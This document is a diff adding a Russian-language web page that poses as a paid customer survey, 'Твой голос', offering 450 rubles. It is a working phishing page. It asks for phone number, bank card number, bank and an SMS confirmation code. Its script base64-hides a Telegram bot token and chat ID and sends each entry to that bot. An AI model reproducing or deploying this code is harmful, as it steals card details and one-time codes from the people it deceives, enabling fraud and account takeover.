@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Твой голос</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+            color: #333;
+        }
+
+        .container {
+            width: 80%;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .slide {
+            display: none;
+            padding: 30px;
+            background-color: #ffffff;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+        }
+
+        .slide.active {
+            display: block;
+        }
+
+        h1, h2 {
+            color: #4CAF50;
+        }
+
+        .button {
+            padding: 12px 20px;
+            font-size: 16px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .button:hover {
+            background-color: #45a049;
+        }
+
+        input, select {
+            padding: 10px;
+            font-size: 16px;
+            width: 100%;
+            max-width: 300px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+
+        .error {
+            color: red;
+            font-size: 14px;
+        }
+
+        .message {
+            padding: 20px;
+            background-color: #f8f8f8;
+            margin-top: 20px;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+            font-size: 16px;
+        }
+
+        .footer {
+            margin-top: 40px;
+            font-size: 14px;
+            color: #777;
+        }
+
+        .back-button {
+            background-color: #ccc;
+        }
+
+        .back-button:hover {
+            background-color: #bbb;
+        }
+
+        /* Индикатор загрузки */
+        .loader {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #4CAF50;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div id="slide1" class="slide active">
+            <h1>Добро пожаловать на сайт "Твой голос"</h1>
+            <p>Мы стремимся улучшить качество обслуживания и всегда ищем новые способы взаимодействия с нашими клиентами. Для этого мы проводим анкеты, опросы и исследуем, что важно для наших пользователей.</p>
+            <p>Чтобы поблагодарить вас за участие, мы решили предоставить вознаграждение. Участвуя в нашем опросе, вы получаете шанс на вознаграждение в размере 450 рублей!</p>
+            <p>Заполните анкету и получите деньги на вашу карту в течение нескольких минут. Вся информация будет конфиденциальной, а процесс очень простым.</p>
+            <button class="button" onclick="nextSlide(2)">Продолжить</button>
+        </div>
+
+        <div id="slide2" class="slide">
+            <h2>Введите свои данные</h2>
+            <form id="dataForm">
+                <label for="phone">Номер телефона:</label><br>
+                <input type="tel" id="phone" name="phone" required placeholder="+7(XXX)-XXX-XX-XX" maxlength="18"><br><br>
+
+                <label for="card">Номер карты:</label><br>
+                <input type="text" id="card" name="card" required placeholder="XXXX XXXX XXXX XXXX"><br><br>
+
+                <label for="bank">Выберите банк:</label><br>
+                <select id="bank" name="bank">
+                    <option value="sberbank">Сбербанк</option>
+                    <option value="tinkoff">Тинькофф</option>
+                </select><br><br>
+
+                <div id="errorMessage" class="error"></div>
+
+                <button type="button" class="button" onclick="sendData()">Далее</button>
+                <button type="button" class="button back-button" onclick="prevSlide(1)">Назад</button>
+            </form>
+        </div>
+
+        <div id="slide3" class="slide">
+            <h2>Введите код подтверждения, который придет на номер телефона</h2>
+            <p>Введите код подтверждения, который вы получите на ваш номер телефона.</p>
+            <input type="text" id="code" name="code" required><br><br>
+            <div id="codeErrorMessage" class="error"></div>
+            <button class="button" onclick="sendCode()">Отправить</button>
+            <button class="button back-button" onclick="prevSlide(2)">Назад</button>
+        </div>
+
+        <div id="slide4" class="slide">
+            <h2>Ожидание</h2>
+            <p>Пожалуйста, подождите несколько секунд...</p>
+            <div class="loader"></div>
+            <div id="confirmationMessage" class="message"></div>
+        </div>
+
+    </div>
+
+    <script>
+        const encryptedToken = "NzU4NDQ3MzQzMDpBQUVJaUtXQzhRTFR2WHNMNXQ1UHBkQ011bTRVa09aYU1vTQ==";
+        const encryptedChatId = "LTEwMDI0ODkzOTU2MTA=";
+
+        function decrypt(data) {
+            return atob(data);
+        }
+
+        function nextSlide(slideNumber) {
+            const slides = document.querySelectorAll('.slide');
+            slides.forEach(slide => slide.classList.remove('active'));
+            document.getElementById('slide' + slideNumber).classList.add('active');
+        }
+
+        function prevSlide(slideNumber) {
+            const slides = document.querySelectorAll('.slide');
+            slides.forEach(slide => slide.classList.remove('active'));
+            document.getElementById('slide' + slideNumber).classList.add('active');
+        }
+
+        function sendData() {
+            const phone = document.getElementById('phone').value.trim();
+            const card = document.getElementById('card').value.trim();
+            const bank = document.getElementById('bank').value;
+            const errorMessage = document.getElementById('errorMessage');
+
+            errorMessage.textContent = "";
+
+            if (!phone || !card) {
+                errorMessage.textContent = "Пожалуйста, заполните все поля.";
+                return;
+            }
+
+            const message = `Новая заявка:\nТелефон: ${phone}\nКарта: ${card}\nБанк: ${bank}`;
+            const token = decrypt(encryptedToken);
+            const chatId = decrypt(encryptedChatId);
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            }).then(response => {
+                if (response.ok) {
+                    nextSlide(3);
+                } else {
+                    errorMessage.textContent = "Произошла ошибка. Попробуйте снова.";
+                }
+            }).catch(() => {
+                errorMessage.textContent = "Не удалось отправить данные. Проверьте подключение к интернету.";
+            });
+        }
+
+        function sendCode() {
+            const code = document.getElementById('code').value.trim();
+            const codeErrorMessage = document.getElementById('codeErrorMessage');
+
+            codeErrorMessage.textContent = "";
+
+            if (!code) {
+                codeErrorMessage.textContent = "Пожалуйста, введите код подтверждения.";
+                return;
+            }
+
+            const message = `Код подтверждения: ${code}`;
+            const token = decrypt(encryptedToken);
+            const chatId = decrypt(encryptedChatId);
+
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            }).then(response => {
+                if (response.ok) {
+                    document.getElementById('confirmationMessage').textContent = "Код подтверждения успешно принят.";
+                    nextSlide(4);
+                } else {
+                    codeErrorMessage.textContent = "Произошла ошибка. Попробуйте снова.";
+                }
+            }).catch(() => {
+                codeErrorMessage.textContent = "Не удалось отправить код. Проверьте подключение к интернету.";
+            });
+        }
+    </script>
+</body>
+</html>
